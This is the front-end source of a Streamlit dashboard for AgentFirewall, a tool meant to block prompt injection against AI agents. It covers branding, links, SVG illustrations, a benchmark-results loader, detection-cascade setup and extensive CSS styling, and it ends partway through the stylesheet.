"""
Streamlit dashboard for AgentFirewall.

A risk-aware firewall for AI agents that stops prompt injection attacks.
Dark security-console theme with instant comprehension for non-technical visitors.

Usage:
    streamlit run dashboard/app.py
"""

from __future__ import annotations

import csv
import hashlib
import sys
import urllib.request
from pathlib import Path
from typing import Any, Optional

# Add project root to path
sys.path.insert(0, str(Path(__file__).parent.parent))

import streamlit as st
import streamlit.components.v1 as components

# Page Configuration MUST be the first Streamlit call
st.set_page_config(
    page_title="AgentFirewall",
    page_icon="🛡️",
    layout="wide",
    initial_sidebar_state="collapsed",
)

from agent_firewall.cascade import Cascade
from agent_firewall.judge import BaseJudge, JudgeResult, make_judge
from agent_firewall.policy import Decision, Policy, RiskLevel

# ---------------------------------------------------------------------------
# Brand & Links Definitions (Single Source of Truth)
# ---------------------------------------------------------------------------
BRAND_NAME = "AgentFirewall"
BRAND_TAGLINE = "Stops hidden instructions from hijacking AI agents."
AUTHOR_NAME = "Divya Karotra"

# Single source of truth for all links
LINKS: dict[str, str] = {
    "github_repo": "https://github.com/DivyaKarotra/agent-firewall",
    "issues": "https://github.com/DivyaKarotra/agent-firewall/issues",
    "docs": "https://DivyaKarotra.github.io/agent-firewall/",
    "pypi": "https://pypi.org/project/agent-firewall-cascade/",
    "dataset": "https://huggingface.co/datasets/DivyaKarotra/agent-firewall-benchmark",
    "author_profile": "https://github.com/DivyaKarotra",
    "license": "https://github.com/DivyaKarotra/agent-firewall/blob/main/LICENSE",
}

# Live flags for items published or pending
LIVE: dict[str, bool] = {
    "github": True,
    "docs": True,
    "pypi": True,
    "dataset": True,
}

# Compatibility aliases
REPO_URL = LINKS["github_repo"]
DOCS_URL = LINKS["docs"]
ISSUES_URL = LINKS["issues"]
PYPI_URL = LINKS["pypi"]
DATASET_URL = LINKS["dataset"]
AUTHOR_GITHUB = LINKS["author_profile"]
LICENSE_URL = LINKS["license"]

# Text / background colour pairs for WCAG contrast verification (contrast >= 4.5:1)
PALETTE_PAIRS: dict[str, tuple[str, str]] = {
    "body_text_on_bg": ("#E8ECF8", "#0B1020"),
    "body_text_on_surface": ("#E8ECF8", "#121A33"),
    "body_text_on_card": ("#E8ECF8", "#172042"),
    "muted_text_on_bg": ("#A9B3D1", "#0B1020"),
    "muted_text_on_card": ("#A9B3D1", "#172042"),
    "verdict_allow_title": ("#22C55E", "#0F2E1D"),
    "verdict_allow_body": ("#E8ECF8", "#0F2E1D"),
    "verdict_ask_title": ("#F59E0B", "#33260A"),
    "verdict_ask_body": ("#E8ECF8", "#33260A"),
    "verdict_block_title": ("#F87171", "#300E12"),
    "verdict_block_body": ("#E8ECF8", "#300E12"),
    "accent_cyan_on_bg": ("#22D3EE", "#0B1020"),
    "accent_cyan_on_card": ("#22D3EE", "#172042"),
    "pill_attack": ("#F87171", "#300E12"),
    "pill_normal": ("#22C55E", "#0F2E1D"),
    "pill_checked": ("#22D3EE", "#163B48"),
    "pill_skipped": ("#E8ECF8", "#1F2942"),
    "pill_offline": ("#F59E0B", "#33260A"),
}

# ---------------------------------------------------------------------------
# Inline SVG Assets (Original Logo and Icons)
# ---------------------------------------------------------------------------
LOGO_SVG = """<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" width="40" height="40" fill="none" class="brand-logo-svg">
  <defs>
    <linearGradient id="afShieldGrad" x1="0%" y1="0%" x2="100%" y2="100%">
      <stop offset="0%" stop-color="#22D3EE" />
      <stop offset="100%" stop-color="#6366F1" />
    </linearGradient>
    <linearGradient id="afShieldFill" x1="0%" y1="0%" x2="100%" y2="100%">
      <stop offset="0%" stop-color="#22D3EE" stop-opacity="0.25" />
      <stop offset="100%" stop-color="#6366F1" stop-opacity="0.08" />
    </linearGradient>
  </defs>
  <path d="M24 4L7 11V22C7 32.5 14.2 41.5 24 44C33.8 41.5 41 32.5 41 22V11L24 4Z" fill="url(#afShieldFill)" stroke="url(#afShieldGrad)" stroke-width="2.5" stroke-linejoin="round"/>
  <path d="M18 19L13 24L18 29" stroke="#22D3EE" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/>
  <path d="M30 19L35 24L30 29" stroke="#6366F1" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/>
  <path d="M26 18L22 30" stroke="#E8ECF8" stroke-width="2.2" stroke-linecap="round"/>
</svg>"""

ICON_DOC_SVG = """<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#22D3EE" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline><line x1="16" y1="13" x2="8" y2="13"></line><line x1="16" y1="17" x2="8" y2="17"></line><polyline points="10 9 9 9 8 9"></polyline></svg>"""

ICON_SHIELD_SVG = """<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#6366F1" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg>"""

ICON_TRAFFIC_SVG = """<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#22C55E" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="6" y="2" width="12" height="20" rx="3"></rect><circle cx="12" cy="7" r="1.5" fill="#EF4444"></circle><circle cx="12" cy="12" r="1.5" fill="#F59E0B"></circle><circle cx="12" cy="17" r="1.5" fill="#22C55E"></circle></svg>"""

ICON_RULES_SVG = """<svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#22D3EE" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="16 18 22 12 16 6"></polyline><polyline points="8 6 2 12 8 18"></polyline></svg>"""

ICON_CLASSIFIER_SVG = """<svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#22D3EE" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="18" cy="5" r="3"></circle><circle cx="6" cy="12" r="3"></circle><circle cx="18" cy="19" r="3"></circle><line x1="8.59" y1="13.51" x2="15.42" y2="17.49"></line><line x1="15.41" y1="6.51" x2="8.59" y2="10.49"></line></svg>"""

ICON_JUDGE_SVG = """<svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#6366F1" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"></circle><path d="M12 16v-4"></path><path d="M12 8h.01"></path></svg>"""

HERO_ILLUSTRATION_SVG = """<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 520 280" width="100%" height="auto" class="hero-illustration-svg" style="max-width: 520px; display: block; margin: 0 auto;" aria-label="AgentFirewall protection diagram">
  <defs>
    <linearGradient id="shieldGrad" x1="0%" y1="0%" x2="100%" y2="100%">
      <stop offset="0%" stop-color="#22D3EE" />
      <stop offset="100%" stop-color="#6366F1" />
    </linearGradient>
    <filter id="subtleGlow" x="-20%" y="-20%" width="140%" height="140%">
      <feDropShadow dx="0" dy="2" stdDeviation="4" flood-color="#000000" flood-opacity="0.3"/>
    </filter>
  </defs>

  <!-- TOP FLOW: POISONED ATTACK (BLOCKED) -->
  <g filter="url(#subtleGlow)">
    <rect x="12" y="24" width="180" height="96" rx="12" fill="#172042" stroke="#263261" stroke-width="1.5" />
    <rect x="24" y="36" width="16" height="12" rx="2" fill="none" stroke="#22D3EE" stroke-width="1.5" />
    <path d="M24 38L32 44L40 38" stroke="#22D3EE" stroke-width="1.5" fill="none" />
    <text x="46" y="47" fill="#E8ECF8" font-size="14" font-weight="600" font-family="'Inter', sans-serif">Incoming Email</text>
    <text x="24" y="70" fill="#A9B3D1" font-size="14" font-family="'Inter', sans-serif">Review Q3 numbers...</text>
    <rect x="22" y="82" width="160" height="26" rx="6" fill="#300E12" stroke="#EF4444" stroke-width="1" />
    <text x="28" y="99" fill="#F87171" font-size="14" font-weight="700" font-family="'JetBrains Mono', monospace">&lt;hidden: leak&gt;</text>
  </g>

  <!-- Arrow to shield -->
  <path d="M202 72 L234 72" stroke="#EF4444" stroke-width="2" stroke-dasharray="4 3" />
  <polygon points="238,72 230,68 230,76" fill="#EF4444" />

  <!-- Shield Gate in Center (Top Path) -->
  <g filter="url(#subtleGlow)">
    <path d="M260 48 L278 40 L296 48 V74 C296 86 288 96 278 100 C268 96 260 86 260 74 Z" fill="#121A33" stroke="url(#shieldGrad)" stroke-width="2" />
    <line x1="270" y1="64" x2="286" y2="80" stroke="#EF4444" stroke-width="2.5" stroke-linecap="round" />
    <line x1="286" y1="64" x2="270" y2="80" stroke="#EF4444" stroke-width="2.5" stroke-linecap="round" />
  </g>

  <!-- Arrow from shield to verdict -->
  <path d="M306 72 L338 72" stroke="#EF4444" stroke-width="2" />
  <polygon points="342,72 334,68 334,76" fill="#EF4444" />

  <!-- Verdict Tag: BLOCKED (Right) -->
  <g filter="url(#subtleGlow)">
    <rect x="352" y="48" width="156" height="48" rx="10" fill="#300E12" stroke="#EF4444" stroke-width="1.5" />
    <circle cx="374" cy="72" r="9" fill="#EF4444" />
    <path d="M370 72 L378 72" stroke="#FFFFFF" stroke-width="2" stroke-linecap="round" />
    <text x="392" y="77" fill="#F87171" font-size="15" font-weight="700" font-family="'Inter', sans-serif">BLOCKED</text>
  </g>

  <!-- BOTTOM FLOW: NORMAL BENIGN (ALLOWED) -->
  <g filter="url(#subtleGlow)">
    <rect x="12" y="156" width="180" height="96" rx="12" fill="#172042" stroke="#263261" stroke-width="1.5" />
    <rect x="24" y="168" width="16" height="12" rx="2" fill="none" stroke="#22D3EE" stroke-width="1.5" />
    <path d="M24 170L32 176L40 170" stroke="#22D3EE" stroke-width="1.5" fill="none" />
    <text x="46" y="179" fill="#E8ECF8" font-size="14" font-weight="600" font-family="'Inter', sans-serif">Routine Note</text>
    <text x="24" y="202" fill="#E8ECF8" font-size="14" font-family="'Inter', sans-serif">Lunch at 12:30 today?</text>
    <rect x="22" y="214" width="160" height="26" rx="6" fill="#0F2E1D" stroke="#22C55E" stroke-width="1" />
    <text x="28" y="231" fill="#22C55E" font-size="14" font-weight="700" font-family="'Inter', sans-serif">clean message</text>
  </g>

  <!-- Arrow to shield -->
  <path d="M202 204 L234 204" stroke="#22C55E" stroke-width="2" />
  <polygon points="238,204 230,200 230,208" fill="#22C55E" />

  <!-- Shield Gate in Center (Bottom Path) -->
  <g filter="url(#subtleGlow)">
    <path d="M260 180 L278 172 L296 180 V206 C296 218 288 228 278 232 C268 228 260 218 260 206 Z" fill="#121A33" stroke="url(#shieldGrad)" stroke-width="2" />
    <path d="M271 202 L276 207 L285 197" stroke="#22C55E" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" fill="none" />
  </g>

  <!-- Arrow from shield to verdict -->
  <path d="M306 204 L338 204" stroke="#22C55E" stroke-width="2" />
  <polygon points="342,204 334,200 334,208" fill="#22C55E" />

  <!-- Verdict Tag: ALLOWED (Right) -->
  <g filter="url(#subtleGlow)">
    <rect x="352" y="180" width="156" height="48" rx="10" fill="#0F2E1D" stroke="#22C55E" stroke-width="1.5" />
    <circle cx="374" cy="204" r="9" fill="#22C55E" />
    <path d="M370 204 L373 207 L379 200" stroke="#0F2E1D" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" fill="none" />
    <text x="392" y="209" fill="#22C55E" font-size="15" font-weight="700" font-family="'Inter', sans-serif">ALLOWED</text>
  </g>
</svg>"""


# ---------------------------------------------------------------------------
# Engine & Examples Imports (Re-exported for backward compatibility)
# ---------------------------------------------------------------------------
from dashboard.engine import (
    FRIENDLY_RULE_LABELS,
    PROFILE_HELP,
    CloudDemoJudge,
    Trace,
    check_ollama_reachable,
    generate_verdict_sentence,
    get_friendly_rule_label,
    get_honest_note,
    scan,
)
from dashboard.examples import (
    BENCHMARK_EXAMPLES,
    DEMO_EMAILS,
    EXAMPLES,
    NORMAL_EMAIL,
    NORMAL_EMAIL_VERDICT,
    POISONED_EMAIL,
    POISONED_EMAIL_VERDICT,
    PRECOMPUTED_MAP,
)


# ---------------------------------------------------------------------------
# Results File Loader (Dynamic, Never Hardcoded)
# ---------------------------------------------------------------------------
@st.cache_data
def load_benchmark_results() -> dict[str, Any]:
    """Read real benchmark numbers from the results files."""
    base_dir = Path(__file__).parent.parent / "results"
    ablation_file = base_dir / "ablation_fresh_ollama_v2.md"
    details_file = base_dir / "details_fresh_ollama_v2.csv"

    stats: dict[str, Any] = {
        "rules_classifier_catch": "83.9%",
        "rules_classifier_fp": "5.1%",
        "full_cascade_catch": "85.7%",
        "full_cascade_fp": "5.1%",
        "sample_count": 115,
        "note": "exploratory set, small sample, see limitations",
    }

    try:
        if ablation_file.exists():
            content = ablation_file.read_text(encoding="utf-8")
            for line in content.splitlines():
                if "rules_classifier" in line and "fresh" in line:
                    parts = [p.strip() for p in line.split("|") if p.strip()]
                    if len(parts) >= 4:
                        stats["rules_classifier_catch"] = parts[2].split()[0]
                        stats["rules_classifier_fp"] = parts[3].split()[0]
                elif "gated_cascade" in line and "fresh" in line:
                    parts = [p.strip() for p in line.split("|") if p.strip()]
                    if len(parts) >= 4:
                        stats["full_cascade_catch"] = parts[2].split()[0]
                        stats["full_cascade_fp"] = parts[3].split()[0]

        if details_file.exists():
            with details_file.open("r", encoding="utf-8") as f:
                reader = csv.DictReader(f)
                rows = list(reader)
                if rows:
                    stats["sample_count"] = len(rows)
    except Exception:
        pass

    return stats


_PRECOMPUTED_MAP = PRECOMPUTED_MAP


@st.cache_resource
def get_classifier_model():
    """Load or train calibrated classifier lazily on first need."""
    try:
        from agent_firewall.classifier import MODEL_PATH, Classifier, is_available, load_data

        if is_available():
            clf = Classifier()
            if MODEL_PATH.exists():
                clf.load()
            else:
                train_texts, train_labels, _, _ = load_data()
                clf.train(train_texts, train_labels, calibrate=True)
            return clf
    except Exception:
        pass
    return None


@st.cache_resource
def get_cascade(
    judge_name: str = "precomputed",
    model: str = "llama3.2:3b",
    combine: str = "gated",
    prompt_ver: str = "v2",
    with_clf: bool = True,
    profile: str = "balanced",
    is_live_ollama: bool = False,
):
    """Build and cache the detection cascade."""
    if "none" in judge_name:
        judge_obj = None
    elif "mock" in judge_name:
        judge_obj = make_judge("mock", prompt_version=prompt_ver)
    elif "openai" in judge_name:
        judge_obj = make_judge("openai", model=model, prompt_version=prompt_ver)
    elif is_live_ollama and "ollama" in judge_name:
        live_ollama = make_judge("ollama", model=model, prompt_version=prompt_ver)
        judge_obj = CloudDemoJudge(precomputed=_PRECOMPUTED_MAP, live_judge=live_ollama)
    else:
        judge_obj = CloudDemoJudge(precomputed=_PRECOMPUTED_MAP, live_judge=None)

    clf = get_classifier_model() if with_clf else None
    return Cascade(judge=judge_obj, classifier=clf, combine=combine, profile=profile)


# ---------------------------------------------------------------------------
# Custom CSS (Dark Security Console Look, Inter & JetBrains Mono Typography)
# ---------------------------------------------------------------------------
CSS_STYLING = """
<style>
@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;700&display=swap');

/* Smooth scrolling and target scroll margin (Header 68px + 16px = 84px) */
html {
  scroll-behavior: smooth !important;
}

[id],
h2[id],
.section-heading,
#live-demo,
#who-its-for,
#scan-your-own-text,
#how-it-works,
#why-layers,
#benchmarks {
  scroll-margin-top: 84px !important;
}

/* Hide Streamlit default chrome & footer while keeping accessibility */
#MainMenu,
footer:not(.site-footer),
header[data-testid="stHeader"],
.stHeader,
.stDeployButton,
div[data-testid="stToolbar"],
div[data-testid="stDecoration"],
div[data-testid="stStatusWidget"] {
  display: none !important;
  visibility: hidden !important;
  height: 0 !important;
  pointer-events: none !important;
}

/* Global Typography & Background */
html, body, .stApp {
  font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
  color: #E8ECF8;
  background-color: #0B1020;
  font-size: 17px !important;
  line-height: 1.6 !important;
}

/* Explicitly preserve Streamlit Material icon fonts against global overrides */
[data-testid="stIconMaterial"],
[data-testid*="Icon"],
[class*="material-symbols"],
[class*="material-icons"],
.material-symbols-rounded,
.material-symbols-outlined,
.material-icons,
span[class*="material"] {
  font-family: "Material Symbols Rounded", "Material Symbols Outlined", "Material Icons" !important;
  letter-spacing: normal !important;
  text-transform: none !important;
  white-space: nowrap !important;
  word-wrap: normal !important;
  direction: ltr !important;
  -webkit-font-smoothing: antialiased !important;
}

/* Restrict font override to standard text elements and exclude icon containers */
[class*="st-"]:not([data-testid="stIconMaterial"]):not([data-testid*="Icon"]):not([class*="material"]):not(.material-icons):not(.material-symbols-rounded):not(.material-symbols-outlined) {
  font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
  background-color: transparent;
}

code, pre, .mono-font {
  font-family: 'JetBrains Mono', monospace !important;
  font-size: 15px !important;
}

/* Base Headings & Markdown reset to completely eliminate unintended dark boxes */
h1, h2, h3, h4, h5, h6,
.hero-headline,
.hero-left-col,
.hero-right-col,
div[data-testid="stMarkdownContainer"] {
  background: transparent !important;
  background-color: transparent !important;
  border: none !important;
  box-shadow: none !important;
}

.hero-container h1,
.hero-container h2,
.hero-container h3,
.hero-container p,
.hero-container div:not(.hero-stat-chip):not(.hero-cta-btn):not(.hero-btn-row):not(.hero-chips-row):not(.hero-grid) {
  background: transparent !important;
  background-color: transparent !important;
}

.hero-headline {
  background: none !important;
  background-color: transparent !important;
  margin: 0 0 12px 0 !important;
  padding: 0 !important;
  font-size: clamp(36px, 5vw, 64px) !important;
  font-weight: 700 !important;
  line-height: 1.15 !important;
  letter-spacing: -0.5px !important;
  color: #E8ECF8 !important;
}

/* Section Headings */
h2, h3,
div[data-testid="stHeadingWithActionElements"] h2,
div[data-testid="stHeadingWithActionElements"] h3,
div[data-testid="stMarkdownContainer"] h2,
div[data-testid="stMarkdownContainer"] h3 {
  font-size: 30px !important;
  font-weight: 700 !important;
  color: #E8ECF8 !important;
  letter-spacing: -0.3px !important;
  line-height: 1.3 !important;
  margin-top: 32px !important;
  margin-bottom: 8px !important;
}

/* Streamlit captions and secondary text */
div[data-testid="stCaptionContainer"] p,
div[data-testid="stCaptionContainer"] span,
div[data-testid="stCaptionContainer"] {
  font-size: 15px !important;
  color: #A9B3D1 !important;
  line-height: 1.5 !important;
}

/* Streamlit buttons & controls */
button, div[data-testid="stButton"] button {
  font-size: 17px !important;
  font-weight: 600 !important;
  border-radius: 12px !important;
  transition: all 0.15s ease !important;
}

div[data-testid="stButton"] button[kind="primary"] {
  background-color: #22D3EE !important;
  color: #0B1020 !important;
  border: none !important;
  box-shadow: 0 2px 10px rgba(34, 211, 238, 0.25) !important;
}

div[data-testid="stButton"] button[kind="primary"]:hover {
  background-color: #38BDF8 !important;
  transform: translateY(-1px) !important;
}

div[data-testid="stButton"] button[kind="secondary"] {
  background-color: #172042 !important;
  border: 1px solid #263261 !important;
  color: #E8ECF8 !important;
}

div[data-testid="stButton"] button[kind="secondary"]:hover {
  border-color: #22D3EE !important;
  color: #22D3EE !important;
}

/* Form inputs & widgets */
[data-testid="stWidgetLabel"] p,
[data-testid="stWidgetLabel"] label,
label[data-baseweb="radio"],
label[data-baseweb="checkbox"] {
  font-size: 16px !important;
  color: #E8ECF8 !important;
}

label[data-baseweb="radio"] div,
label[data-baseweb="checkbox"] div {
  font-size: 16px !important;
}

textarea,
input,
div[data-baseweb="select"] {
  font-size: 16px !important;
  background-color: #121A33 !important;
  color: #E8ECF8 !important;
  border: 1px solid #263261 !important;
  border-radius: 12px !important;
}

/* BaseWeb Selectbox Popover, Listbox & Menu (Solid Opaque Dark Background, High Z-Index) */
div[data-baseweb="popover"],
div[data-baseweb="popover"] > div,
div[data-baseweb="menu"],
ul[role="listbox"],
[data-baseweb="select"] ul {
  background-color: #121A33 !important;
  background: #121A33 !important;
  opacity: 1 !important;
  border: 1px solid #263261 !important;
  border-radius: 12px !important;
  box-shadow: 0 10px 30px rgba(0, 0, 0, 0.7) !important;
  z-index: 999999 !important;
  color: #E8ECF8 !important;
}

li[role="option"],
div[role="option"],
[data-baseweb="menu"] li,
[data-baseweb="menu"] div {
  background-color: #121A33 !important;
  color: #E8ECF8 !important;
  font-size: 16px !important;
  font-family: 'Inter', sans-serif !important;
  padding: 10px 16px !important;
  transition: background-color 0.15s ease, color 0.15s ease !important;
}

li[role="option"]:hover,
div[role="option"]:hover,
li[role="option"][aria-selected="true"],
div[role="option"][aria-selected="true"],
[data-baseweb="menu"] li:hover,
[data-baseweb="menu"] li[aria-selected="true"] {
  background-color: #1D2A54 !important;
  color: #22D3EE !important;
}

div[data-baseweb="select"] > div {
  background-color: #121A33 !important;
  color: #E8ECF8 !important;
}

/* Metric labels and values */
div[data-testid="stMetricLabel"] p {
  font-size: 15px !important;
  color: #A9B3D1 !important;
}

div[data-testid="stMetricValue"] {
  font-size: 30px !important;
  color: #E8ECF8 !important;
  font-weight: 700 !important;
}

/* Full-width, fluid main container aligned to one grid */
.main .block-container,
div[data-testid="stAppViewBlockContainer"],
.block-container {
  max-width: 1440px !important;
  width: 100% !important;
  margin-left: auto !important;
  margin-right: auto !important;
  padding-left: clamp(16px, 4vw, 48px) !important;
  padding-right: clamp(16px, 4vw, 48px) !important;
  padding-top: 96px !important; /* Top padding for fixed 68px header */
  padding-bottom: 48px !important;
}

/* Fixed Header Bar (68px Height, Always Visible) */
.top-nav-bar {
  position: fixed;
  top: 0;
  left: 0;
  right: 0;
  height: 68px;
  z-index: 1000;
  display: flex;
  align-items: center;
  justify-content: space-between;
  padding: 0 clamp(16px, 4vw, 48px);
  background: rgba(11, 16, 32, 0.96);
  backdrop-filter: blur(12px);
  -webkit-backdrop-filter: blur(12px);
  border-bottom: 1px solid #263261;
  box-shadow: 0 4px 20px rgba(0, 0, 0, 0.4);
}

.brand-wrapper {
  display: flex;
  align-items: center;
  gap: 12px;
  text-decoration: none !important;
}

.brand-wordmark {
  font-size: 22px;
  font-weight: 700;
  letter-spacing: -0.3px;
  color: #E8ECF8;
  display: inline-flex;
  align-items: center;
}

.brand-gradient-text,
.hero-gradient-text {
  display: inline-block;
  background-image: linear-gradient(90deg, #22D3EE, #6366F1);
  -webkit-background-clip: text;
  background-clip: text;
  color: transparent !important;
  -webkit-text-fill-color: transparent !important;
  padding-bottom: 0.1em;
}

@supports not (background-clip: text) {
  .brand-gradient-text,
  .hero-gradient-text {
    color: #22D3EE !important;
    -webkit-text-fill-color: #22D3EE !important;
    background: none !important;
  }
}

.nav-links-cluster {
  display: flex;
  align-items: center;
  gap: 24px;
}

/* Base link styling */
a {
  color: #22D3EE;
  text-decoration: none !important;
  outline-offset: 2px;
}

a:hover, a:focus {
  text-decoration: underline !important;
}

a:focus-visible {
  outline: 2px solid #22D3EE;
}

/* Nav links: 16px, no default underline, cyan hover underline */
.nav-link-item {
  color: #A9B3D1 !important;
  font-size: 16px !important;
  font-weight: 500;
  text-decoration: none !important;
  border-bottom: 2px solid transparent;
  padding: 4px 0;
  transition: color 0.15s ease-in-out, border-color 0.15s ease-in-out;
}

.nav-link-item:hover, .nav-link-item:focus {
  color: #22D3EE !important;
  text-decoration: none !important;
  border-bottom: 2px solid #22D3EE;
}

.nav-link-item:focus-visible {
  outline: 2px solid #22D3EE;
}

.nav-github-btn {
  display: inline-flex;
  align-items: center;
  padding: 6px 16px;
  border: 1px solid #22D3EE;
  color: #22D3EE !important;
  border-radius: 8px;
  font-size: 15px !important;
  font-weight: 600;
  text-decoration: none !important;
  transition: background-color 0.15s ease, color 0.15s ease;
}

.nav-github-btn:hover, .nav-github-btn:focus {
  background-color: #163B48;
  color: #22D3EE !important;
  text-decoration: none !important;
}

.nav-link-disabled,
.footer-link-disabled {
  cursor: default;
  color: #7C8BAE !important;
  text-decoration: none !important;
  pointer-events: none;
}

.nav-soon-pill {
  display: inline-block;
  font-size: 14px !important;
  font-weight: 700 !important;
  text-transform: uppercase;
  padding: 1px 6px;
  border-radius: 4px;
  background: #172042;
  border: 1px solid #263261;
  color: #22D3EE;
  margin-left: 5px;
  vertical-align: middle;
}

/* In-Page Target Anchors Scroll Margin */
.nav-target-anchor,
#live-demo,
#who-its-for,
#scan-your-own-text,
#how-it-works,
#why-layers,
#benchmarks {
  scroll-margin-top: 84px !important;
}

/* Hero Section: Calm 2-Column Layout on Wide Screens */
.hero-container {
  position: relative;
  padding: clamp(24px, 3.5vw, 40px);
  background: #121A33;
  border: 1px solid #263261;
  border-radius: 16px;
  box-shadow: 0 4px 24px rgba(0, 0, 0, 0.35);
  margin-bottom: 32px;
}

.hero-grid {
  display: grid;
  grid-template-columns: 1.15fr 0.85fr;
  gap: 32px;
  align-items: center;
}

.hero-left-col {
  display: flex;
  flex-direction: column;
}

.hero-right-col {
  display: flex;
  align-items: center;
  justify-content: center;
}

.hero-headline {
  background: none !important;
  background-color: transparent !important;
  font-size: clamp(36px, 5vw, 64px) !important;
  font-weight: 700;
  line-height: 1.15;
  letter-spacing: -0.5px;
  margin: 0 0 12px 0;
  color: #E8ECF8;
}

.hero-tagline {
  font-size: 22px !important;
  font-weight: 600;
  color: #22D3EE;
  margin-bottom: 16px;
  line-height: 1.4;
}

.hero-body-text {
  font-size: 17px !important;
  line-height: 1.6;
  color: #E8ECF8;
  max-width: 720px;
  margin-bottom: 24px;
}

.hero-btn-row {
  display: flex;
  gap: 16px;
  align-items: center;
  flex-wrap: wrap;
  margin-bottom: 24px;
}

.hero-cta-btn {
  display: inline-flex;
  align-items: center;
  gap: 8px;
  padding: 12px 24px;
  border-radius: 12px;
  font-size: 17px !important;
  font-weight: 600;
  text-decoration: none !important;
  transition: transform 0.15s ease, background-color 0.15s ease;
}

.hero-cta-primary {
  background: #22D3EE !important;
  color: #0B1020 !important;
  text-decoration: none !important;
  font-weight: 700;
  box-shadow: 0 2px 10px rgba(34, 211, 238, 0.25);
}

.hero-cta-primary:hover, .hero-cta-primary:focus {
  color: #0B1020 !important;
  text-decoration: none !important;
  transform: translateY(-2px);
  background-color: #38BDF8 !important;
}

.hero-cta-secondary {
  background: #172042 !important;
  border: 1px solid #263261 !important;
  color: #E8ECF8 !important;
  text-decoration: none !important;
}

.hero-cta-secondary:hover, .hero-cta-secondary:focus {
  background: #1F2942 !important;
  border-color: #22D3EE !important;
  color: #22D3EE !important;
  text-decoration: none !important;
  transform: translateY(-2px);
}

.hero-chips-row {
  display: flex;
  gap: 12px;
  flex-wrap: wrap;
}

.hero-stat-chip {
  display: inline-flex;
  align-items: center;
  padding: 6px 14px;
  background: #172042;
  border: 1px solid #263261;
  border-radius: 20px;
  font-size: 14px !important;
  font-weight: 700 !important;
  color: #A9B3D1;
}

.hero-stat-chip strong {
  color: #22D3EE;
  margin-right: 6px;
}

/* 3-Step Strip: Consistent 16px Radius & 24px Padding */
.strip-container {
  display: grid;
  grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
  gap: 24px;
  margin-bottom: 32px;
  width: 100%;
}

.strip-card {
  padding: 24px;
  background: #172042;
  border: 1px solid #263261;
  border-radius: 16px;
  box-shadow: 0 4px 16px rgba(0, 0, 0, 0.25);
  transition: transform 0.2s ease, border-color 0.2s ease;
  width: 100%;
}

.strip-card:hover {
  transform: translateY(-2px);
  border-color: #22D3EE;
}

.strip-card-top {
  display: flex;
  align-items: center;
  gap: 12px;
  margin-bottom: 12px;
}

.strip-num-badge {
  display: inline-flex;
  align-items: center;
  justify-content: center;
  width: 30px;
  height: 30px;
  border-radius: 50%;
  background: #121A33;
  border: 1px solid #22D3EE;
  color: #22D3EE;
  font-weight: 700 !important;
  font-size: 14px !important;
}

.strip-title {
  font-size: 20px !important;
  font-weight: 700;
  color: #E8ECF8;
}

.strip-desc {
  font-size: 15px !important;
  line-height: 1.55;
  color: #A9B3D1;
  margin: 0;
}

/* Solid Dark Verdict Banners with Thick Colored Border */
.verdict-banner-box {
  padding: 24px;
  border-radius: 16px;
  margin: 24px 0;
  box-shadow: 0 6px 24px rgba(0, 0, 0, 0.4);
}

.verdict-banner-allow {
  background: #0F2E1D !important;
  border-left: 6px solid #22C55E !important;
}

.verdict-banner-ask {
  background: #33260A !important;
  border-left: 6px solid #F59E0B !important;
}

.verdict-banner-block {
  background: #300E12 !important;
  border-left: 6px solid #EF4444 !important;
}

.verdict-title-allow {
  color: #22C55E !important;
  font-size: 24px !important;
  font-weight: 800;
  letter-spacing: 0.5px;
  margin-bottom: 8px;
}

.verdict-title-ask {
  color: #F59E0B !important;
  font-size: 24px !important;
  font-weight: 800;
  letter-spacing: 0.5px;
  margin-bottom: 8px;
}

.verdict-title-block {
  color: #F87171 !important;
  font-size: 24px !important;
  font-weight: 800;
  letter-spacing: 0.5px;
  margin-bottom: 8px;
}

.verdict-body-text {
  color: #E8ECF8 !important;
  font-size: 18px !important;
  line-height: 1.55;
  font-weight: 500;
  margin: 0;
}

/* Layer Cards Grid: Uniform Height, Pinned Bottom */
.layer-cards-grid {
  display: grid;
  grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
  gap: 24px;
  margin-top: 24px;
  margin-bottom: 32px;
  width: 100%;
  align-items: stretch;
}

.layer-card-container {
  padding: 24px;
  background: #172042;
  border: 1px solid #263261;
  border-radius: 16px;
  box-shadow: 0 4px 16px rgba(0, 0, 0, 0.25);
  display: flex;
  flex-direction: column;
  justify-content: space-between;
  height: 100%;
  width: 100%;
}

.layer-card-header {
  display: flex;
  align-items: center;
  justify-content: space-between;
  margin-bottom: 12px;
}

.layer-card-title-wrap {
  display: flex;
  align-items: center;
  gap: 8px;
  font-size: 20px !important;
